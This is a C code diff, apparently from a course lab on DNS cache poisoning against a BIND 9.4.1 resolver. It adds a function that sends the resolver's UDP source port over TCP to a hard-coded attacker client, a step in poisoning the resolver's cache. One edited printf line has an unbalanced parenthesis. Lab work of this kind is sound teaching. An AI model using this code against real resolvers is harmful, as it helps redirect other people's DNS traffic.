@@ -15,6 +15,71 @@
 
 #define PORT_DNS 53
 
+#define ATTACKER_CLIENT_IP   "192.168.1.202"
+#define RESOLVER_IP   "192.168.1.203"
+#define ATTACKER_TCP_PORT    1234        //todo check port
+#define MAX_LEN_PORT 64
+
+static void send_resolver_port_over_tcp(uint16_t port) {
+  int sockfd;
+  struct sockaddr_in dest;
+  char buf[MAX_LEN_PORT];
+  int len;
+
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  if (sockfd < 0) {
+    perror("socket (tcp)");
+    return;
+  }
+
+  // setting options - taken from ex0.pdf
+  // allows reusing a local addr (IP+PORT) even if it's still marked "in use" after closing
+  // (in case restarting server quickly)
+  int opt = 1;
+  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+    printf("setsockopt(SO_REUSEADDR) failed...\n");
+    close(sockfd);
+    exit(1);
+  }
+  // reusing port - allows multiple sockets (or processes) to bind to the same port number.
+  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
+    printf("setsockopt(SO_REUSEPORT) failed...\n");
+    close(sockfd);
+    exit(1);
+  }
+
+  memset(&dest, 0, sizeof(dest));
+  dest.sin_family = AF_INET;
+  dest.sin_port = htons(ATTACKER_TCP_PORT);
+  if (inet_pton(AF_INET, ATTACKER_CLIENT_IP, &dest.sin_addr) != 1) {
+    perror("inet_pton");
+    close(sockfd);
+    return;
+  }
+
+  if (connect(sockfd, (struct sockaddr *)&dest, (socklen_t)sizeof(dest)) < 0) {
+    perror("connect to attacker client");
+    close(sockfd);
+    return;
+  }
+
+  len = snprintf(buf, sizeof(buf), "%u\n", (unsigned int)port);
+  if (len < 0 || len >= (int)sizeof(buf)) {
+    fprintf(stderr, "snprintf error when formatting port\n");
+    close(sockfd);
+    return;
+  }
+
+  if (send(sockfd, buf, (size_t)len, 0) < 0) {
+    perror("send(port)");
+  } else {
+    printf("sent resolver port %u to attacker client over TCP\n",
+           (unsigned int)port);
+  }
+
+  close(sockfd);
+}
+
 /**
  * parse_dns_query - Parse raw DNS query buffer into ldns packet structure
  * @buffer: Raw DNS query buffer
@@ -295,7 +360,7 @@ int main() {
   printf("DNS Server listening on UDP port %d\n", PORT_DNS);
   printf("Waiting for queries from BIND 9.4.1 recursive resolver...\n\n");
 
-
+  int resolver_udp_port_sent = 0;
   // Receive and handle DNS queries
   while (1) {
     // waits for a packet, stores it in buf and records sender's address
@@ -311,8 +376,16 @@ int main() {
       perror("recvfrom");
       continue;
     }
-    printf("Got %zd bytes from %s:%u\n",bytes_received,inet_ntoa
-        (client_addr.sin_addr),(unsigned int)ntohs(client_addr.sin_port));
+    char *src_ip_str = inet_ntoa(client_addr.sin_addr);
+    uint16_t src_port = ntohs(client_addr.sin_port);
+    printf("Got %zd bytes from %s:%u\n",bytes_received,inet_ntoa(client_addr.sin_addr),(unsigned
+    int)
+    src_port));
+    // if this packet is from resolver and we havent sent the port yet
+    if (resolver_udp_port_sent==0 && strcmp(src_ip_str,RESOLVER_IP)==0){
+      send_resolver_port_over_tcp ((int) src_port);
+      resolver_udp_port_sent=1;
+    }
 
     // Handle the DNS query and capture source port
     handle_dns_query(sockfd, &client_addr, buffer, (size_t)bytes_received);
